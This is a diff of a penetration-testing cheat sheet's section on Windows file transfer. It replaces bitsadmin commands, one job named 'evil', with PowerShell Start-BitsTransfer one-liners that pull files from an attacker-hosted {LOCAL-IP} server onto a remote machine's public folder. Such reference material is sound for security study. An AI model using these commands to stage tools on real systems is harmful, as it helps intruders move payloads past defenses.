@@ -178,17 +178,17 @@ USING WinRM -
 USING BITSADMIN - 
 ------------------------------------------------------------------------------------------------------------------
 
-**Web Content Download**
+**Download a single file from Local PC to Remote PC**
     
-    bitsadmin /transfer n http://{LOCAL-IP}/demo.txt C:\temp\demo.txt
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination '\users\public\demo.txt' -TransferType Download"
+    
+**Download a multiple files from Local PC to Remote PC**
+    
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo1.txt', 'http://{LOCAL-IP}/demo2.txt' -Destination 'c:\users\public\demo1.txt', 'c:\users\public\demo2.txt' -TransferType Download"
 
-**Web Content Download**
+**Download a multiple files from Local PC to Remote PC using wildcard**
     
-    bitsadmin /transfer evil /download /priority high http://{LOCAL-IP}:80/demo.txt c:\temp\demo.txt
-
-**Web Content Download**
-    
-    powershell.exe -c Import-Module bitstransfer;Start-BitsTransfer -Source "http://{LOCAL-IP}/demo.txt" -Destination "C:\temp\demo.txt"
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source '\users\public\*.txt' -Destination '\users\public\' -TransferType Download"
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
